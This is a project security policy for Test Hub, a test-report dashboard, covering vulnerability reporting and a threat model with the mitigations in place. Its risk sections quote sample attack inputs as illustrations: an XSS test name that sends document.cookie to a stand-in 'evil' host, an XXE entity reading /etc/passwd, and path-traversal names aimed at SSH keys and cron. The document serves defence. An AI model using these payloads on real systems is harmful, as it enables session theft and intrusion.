# Security policy

## Reporting a vulnerability

**Report privately, through GitHub Security Advisories:**

> <https://github.com/prashanth-sams/test-hub/security/advisories/new>

That form is private between you and the maintainers, gives us somewhere to work
on a fix without it being visible, and can issue a CVE and credit you when we
publish. Please use it rather than a public issue, a pull request, or a message
on Discussions.

If GitHub is not available to you, email **security@test-hub.dev** with `test-hub`
in the subject.

### What to include

Whatever you have. A report that is only "the XML parser looks unsafe" is still
worth sending. These are the things that shorten the round trip:

- The version (`test-hub --version`) and how it is deployed — pip, Docker, behind
  a proxy, exposed to a network or not.
- What an attacker can do, concretely. Test Hub's blast radius depends heavily on
  who can reach the port; "any CI job that can POST a report can read every other
  team's results" is a very different report from "a user who can already edit
  the config can crash the server".
- A reproducer. A crafted report file is ideal, since that is the main untrusted
  input. Cut it down and strip anything of yours out of it.

### What to expect

| | |
|---|---|
| Acknowledgement | **within 72 hours** — a human, not an autoresponder, confirming we have it and what we think it is |
| Initial assessment | within 7 days: severity, whether we agree, and a rough timeline |
| Fix for a high-severity issue | targeted at 30 days from acknowledgement |
| Disclosure | coordinated with you; the advisory is published with the fix, and you are credited unless you would rather not be |

If 72 hours pass without a reply, please assume something went wrong with
notifications rather than that you are being ignored — ping the maintainer on the
advisory thread or open a public issue saying only "I have sent a security report
and had no reply", with no details.

Test Hub is maintained by a small number of people, in the open, unpaid. We will
tell you honestly if a fix is going to be slow rather than let a deadline pass in
silence.

### Safe harbour

We will not pursue or support legal action against anyone who reports in good
faith, stays within their own systems and data, avoids privacy violations and
service degradation, and gives us reasonable time to fix the problem before
going public. Testing against **your own** Test Hub instance is always fine.

## Supported versions

| Version | Supported |
|---|---|
| 0.1.x | ✅ Current release line — fixes land here |
| < 0.1 | ❌ Pre-release, unsupported |

Test Hub is pre-1.0. Security fixes go to the latest minor release line only;
there is no long-term-support branch, and the upgrade path is `pip install -U`.
Once 1.0 ships, this table will name the two most recent minor versions.

---

## Threat model

The one thing worth understanding about Test Hub's security posture:

> **Test Hub's primary input is untrusted text that it then renders in a
> browser.**

A test failure message contains whatever the test printed — an assertion diff,
an HTTP response body, a stack trace, a fragment of HTML the code under test
produced, the connection string it failed to connect with. It arrives from CI,
often from repositories nobody on the Test Hub side reviews, and it is stored and
shown to humans. Everything below follows from that.

The second thing: **the default deployment has no authentication and is bound to
loopback**, and that combination is load-bearing. `Settings.check_bind_safety()`
in [`src/test_hub/config.py`](src/test_hub/config.py) refuses to bind a
non-loopback interface without either configured tokens or an explicit
`--insecure-no-auth`. There is no configuration in which Test Hub silently
listens to a network with no authentication.

### In scope

These are the classes we care about, and what is done about each.

#### 1. XSS in report data

**The risk.** A test named `<img src=x onerror=fetch('//evil/'+document.cookie)>`
is a perfectly legal test name. So is a failure message containing `</script>`.
Both reach the dashboard. In a self-contained snapshot the whole data set is
embedded *inside* a `<script>` tag, so a `</script>` sequence in a stack trace can
close it and start executing.

**What we do.**

- Every value that reaches the DOM goes through the escaping helpers in
  [`src/test_hub/web/assets/js/00-util.js`](src/test_hub/web/assets/js/00-util.js).
  The rule the frontend is reviewed against: **no `innerHTML` with interpolated
  data.** Text goes in with `textContent`; structure is built with
  `document.createElement`.
- Snapshot JSON is serialised with `<`, `>` and `&` rewritten as the JSON
  escapes `\u003c`, `\u003e` and `\u0026` before it is embedded (`embed_json` in
  [`src/test_hub/export/snapshot.py`](src/test_hub/export/snapshot.py)), so no
  byte sequence in test data can spell `</script` and terminate the element the
  data lives in. The same pass escapes U+2028 and U+2029, which are legal inside
  a JSON string and illegal inside a JavaScript one — a stack trace containing
  either would otherwise turn the whole snapshot into a syntax error. Because
  these are `\uXXXX` escapes rather than HTML entities, the value the browser
  parses is byte-for-byte the value that was serialised.
- The Content-Security-Policy in
  [`src/test_hub/config.py`](src/test_hub/config.py) (`Settings.csp`) is
  `default-src 'none'` with `script-src 'self'`, no `unsafe-inline`, no
  `unsafe-eval`, `frame-ancestors 'none'`, `base-uri 'none'`, `form-action
  'none'`. This is the reason [ADR-0001 D7](docs/adr/0001-architecture.md) forbids
  a CDN and a bundler: a policy that has to allow a remote origin is a policy that
  cannot stop exfiltration.
- Artifacts (screenshots, logs) are served with `Content-Disposition:
  attachment` and `X-Content-Type-Options: nosniff`, and always with the content
  type that was *stored* rather than one sniffed from the bytes
  (`download_artifact` in
  [`src/test_hub/api/routes/queries.py`](src/test_hub/api/routes/queries.py)).
  An artifact is attacker-supplied content on our own origin; those two headers
  are what make an uploaded `.html` a download instead of a page on the
  dashboard's origin.

**Caveat, stated plainly:** the CSP above is an HTTP *header*, so it protects the
live dashboard and nothing else. **The exported snapshot carries no CSP** — it is
a single `file://` document, and a `<meta>` policy there would be both weaker
than a header and, under `default-src 'none'`, self-defeating for a file whose
script and style are inline by construction. In the export, the escaping in
`embed_json` and the no-`innerHTML` rule are not defence in depth; they are the
whole defence. That is the reason both are enforced at the point the data is
written rather than at the point it is displayed.

#### 2. XXE and XML entity expansion

**The risk.** JUnit XML is the format everybody has, and a stock XML parser will
happily resolve `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — reading local files
or making outbound requests on behalf of the server — or expand a billion-laughs
entity until the process dies.

**What we do.** All XML parsing goes through **`defusedxml`**, in
[`src/test_hub/adapters/junit_xml.py`](src/test_hub/adapters/junit_xml.py).
External entities, DTD processing and entity expansion are off. `defusedxml` is a
hard runtime dependency in `pyproject.toml` for this reason and not an optional
extra.

**The rule for contributors:** `xml.etree`, `lxml` and `minidom` must not appear
in an import statement anywhere in `src/`. If you are adding an XML-based adapter,
import from `defusedxml`. A pull request that reaches for the standard library
parser will be asked to change, even for "trusted" input — there is no trusted
input here.

#### 3. Decompression bombs and oversized input

**The risk.** A 4 KB gzip that expands to 8 GB; a 40 MB XML file that is one
element with a 40 MB text node; an upload that fills the disk.

**What we do** — the caps live in `Settings`
([`src/test_hub/config.py`](src/test_hub/config.py)) and are enforced while
streaming, not after buffering:

| Setting | Default | Guards |
|---|---|---|
| `max_report_bytes` | 64 MB | the uploaded report, **before** decompression |
| `max_decompressed_bytes` | 512 MB | what a compressed upload may expand to — the zip-bomb ceiling |
| `max_artifact_bytes` | 128 MB | a single attached artifact |
| `max_text_field_bytes` | 256 KB | a single stack trace or log body; longer text is truncated and the attempt is *flagged*, never silently cut |
| `max_events_per_batch` | 5000 | one event batch |

Exceeding a cap raises `PayloadTooLargeError` (HTTP 413) from
[`src/test_hub/errors.py`](src/test_hub/errors.py). The parser-warning cap in
`WarningCollector` ([`src/test_hub/adapters/base.py`](src/test_hub/adapters/base.py))
is the same idea applied to the response: a pathological file produces a bounded
number of warnings and a count of what was dropped.

#### 4. Path traversal in artifact and file names

**The risk.** An artifact named `../../../../home/ci/.ssh/authorized_keys`, or
`screenshots/../../etc/cron.d/x`. On Windows, `..\`, a drive letter, an ADS
suffix (`x.png:evil`) or a reserved device name (`CON`, `NUL`). A report file name
that becomes a path.

**What we do.** Artifact storage is **content-addressed**:
[`src/test_hub/storage/artifacts.py`](src/test_hub/storage/artifacts.py) writes
to `<root>/<aa>/<bb>/<sha256>`, where the path is derived entirely from
`content_digest()` in
[`src/test_hub/domain/identity.py`](src/test_hub/domain/identity.py) — a SHA-256
hex digest, which cannot contain a separator, a dot segment, a colon or a
non-ASCII byte. **The name the user supplied never touches the filesystem.** It is
stored as a database column and shown in the UI, which is a display problem
(see §1) rather than a filesystem one.

This is also why deduplication is free and why an S3 backend is a drop-in: the
key is the digest either way.

#### 5. Secrets in logs and stored test output

**The risk.** This is the one people underestimate. A failing HTTP client test
prints the `Authorization: Bearer …` header it sent. A failing database test
prints the connection URL with the password in it. A CI job that echoes its
environment on failure prints all of it. Test Hub then stores that text, indexes
it, shows it in a browser and puts it in an exported HTML file that gets attached
to a ticket.

**What we do.** `Redactor` in [`src/test_hub/logging.py`](src/test_hub/logging.py)
scrubs text on the way *in* — both log records (via a logging filter installed on
Test Hub's handler) and the failure text an adapter produces. The default patterns
in `DEFAULT_REDACTION_PATTERNS`
([`src/test_hub/config.py`](src/test_hub/config.py)) cover `Bearer`/`Basic`
credentials, PEM private key blocks, database URLs with inline passwords, AWS
access key ids, GitHub `ghp_` tokens, Slack `xox*` tokens, JWTs, and generic
`key=value` shapes for `password`, `token`, `secret`, `api_key`, `client_secret`
and friends. Each pattern replaces only its capture group, so
`password=hunter2` becomes `password=***REDACTED***` and stays diagnosable.

Add your organisation's own shapes with `TEST_HUB_REDACTION_PATTERNS` — every
company has one secret format the defaults have never seen.

**The honest limitation:** redaction is regular expressions over arbitrary text.
It is a strong second line of defence and it is not a guarantee. A base64 blob
with no surrounding keyword, a secret split across lines, a custom token format —
these get through. **Do not treat Test Hub as a place secrets cannot reach.** Treat
it as a system that reduces the damage when they do, and fix the leak at the test.

#### 6. Authentication and tokens

- Tokens are stored as **salted PBKDF2-HMAC-SHA256 hashes**
  (`pbkdf2_sha256$<iterations>$<salt-hex>$<hash-hex>`, 120 000 iterations —
  `hash_token()` in
  [`src/test_hub/api/security.py`](src/test_hub/api/security.py)), never in
  plaintext, and compared with `hmac.compare_digest`. A KDF rather than a bare
  digest because the tokens *we* generate carry 256 bits of entropy and would be
  fine either way, but nothing stops an operator setting
  `TEST_HUB_API_TOKENS=letmein`; PBKDF2 makes that mistake expensive to exploit
  instead of free. A successful verification is memoized per distinct token so
  the KDF does not run on every request. The older `sha256$<salt>$<hash>` form is
  still accepted on input, so an upgrade does not lock anyone out.
- `test-hub token create` prints the token exactly once, prefixed `ths_` so a
  leaked one is greppable and recognisable to a secret scanner. A token is never
  accepted as a command-line argument, because argv is world-readable in `ps` and
  lands in shell history ([ADR-0001 D8](docs/adr/0001-architecture.md)).
- A missing, malformed and wrong token all produce the same response. Which of
  the three it was is free information for an attacker.
- The Docker image bakes **no** token. An image layer is readable by anyone who
  can pull it and survives deleting the tag.
- Bearer tokens on plain HTTP over a network are tokens you have given away. Put
  TLS in front of any deployment that is not on loopback;
  [`docker-compose.yml`](docker-compose.yml) publishes to `127.0.0.1` for exactly
  this reason and says so.

#### 7. Also in scope

- SQL injection (SQLAlchemy Core/ORM with bound parameters throughout; no
  string-built SQL).
- CORS misconfiguration — off by default; `check_bind_safety()` warns loudly
  about `*`.
- Denial of service through unbounded queries — every listing is paged and
  capped.
- Anything that lets one workspace read another's data, even though the OSS
  edition creates only one ([ADR-0001 D9](docs/adr/0001-architecture.md)).
- Dependency vulnerabilities — see `.github/dependabot.yml`.

### Out of scope

Not because they do not matter, but because a report about them will be closed
with a pointer back here:

- **Running `--insecure-no-auth` on a public interface.** It is an explicit
  opt-in that logs a warning on every start and banners the dashboard. Doing it
  anyway is a deployment decision, not a vulnerability.
- **Anyone who can write to `TEST_HUB_DATA_DIR` or the config.** They already own
  the process.
- **The unauthenticated loopback default.** It assumes the machine's local users
  are trusted, which is the same assumption `jupyter notebook` and every
  development server makes. Configure tokens if that is not true for your host.
- **Secrets that redaction did not catch** (see §5's limitation), unless the
  pattern that missed is one the defaults obviously should cover — that is a bug
  report worth making, publicly.
- **Missing rate limiting, audit logs, SSO, RBAC.** Not implemented; not claimed
  anywhere. Feature requests, not vulnerabilities.
- **Write throughput as a DoS vector on SQLite.** Documented as the known ceiling
  in [ADR-0001 D4](docs/adr/0001-architecture.md) and `docs/scaling.md`.
- Findings from an automated scanner with no demonstrated impact, and reports
  about the *absence* of a header on an endpoint that serves no HTML.

---

## For operators

The short checklist, if you are putting this somewhere real:

1. Generate token hashes (`test-hub token create`) and set
   `TEST_HUB_API_TOKEN_HASHES`. Never `TEST_HUB_API_TOKENS` in production — it is
   the plaintext form and exists for local experiments. If you are configuring it
   through Docker Compose, double every `$` in the hash: Compose interpolates
   `$…` in `environment:`, in `.env` and in `env_file:` alike, and will silently
   truncate the hash at the first one. `docker-compose.yml` says so at the point
   where you would paste it.

   **Known issue at 0.1.0:** the comma-separated form of every list-valued
   setting is rejected from the environment — `TEST_HUB_API_TOKEN_HASHES`,
   `TEST_HUB_API_TOKENS`, `TEST_HUB_CORS_ALLOW_ORIGINS`, `TEST_HUB_TRUSTED_HOSTS`
   and `TEST_HUB_REDACTION_PATTERNS` alike. pydantic-settings JSON-decodes
   complex fields before `Settings._split_csv` ever runs, so the process exits
   with `SettingsError: error parsing value for field "api_token_hashes"` before
   it binds. Write the value as a JSON array until that is fixed:

   ```bash
   export TEST_HUB_API_TOKEN_HASHES='["pbkdf2_sha256$120000$SALT$HASH"]'
   ```

   This is a configuration-parsing bug, not an authentication one: with a hash
   configured that way, an unauthenticated write is refused with 401 and a valid
   bearer token is accepted.
2. Put TLS in front of it. Test Hub speaks plain HTTP by design; terminating TLS
   is the proxy's job.
3. Leave the default CSP alone unless you know exactly which directive you are
   loosening and why.
4. Keep `TEST_HUB_CORS_ALLOW_ORIGINS` empty unless a browser app on another
   origin genuinely needs it. Never `*`.
5. Add your own `TEST_HUB_REDACTION_PATTERNS` for your internal secret formats,
   and verify them against a real failing test before you trust them.
6. Treat `TEST_HUB_DATA_DIR` as sensitive at rest. It holds every failure message
   your CI has ever produced. `ensure_directories()` chmods it `0700`; back it up
   with the same care you would give a log archive.
7. Read `docs/deployment.md` before exposing it beyond your own machine.
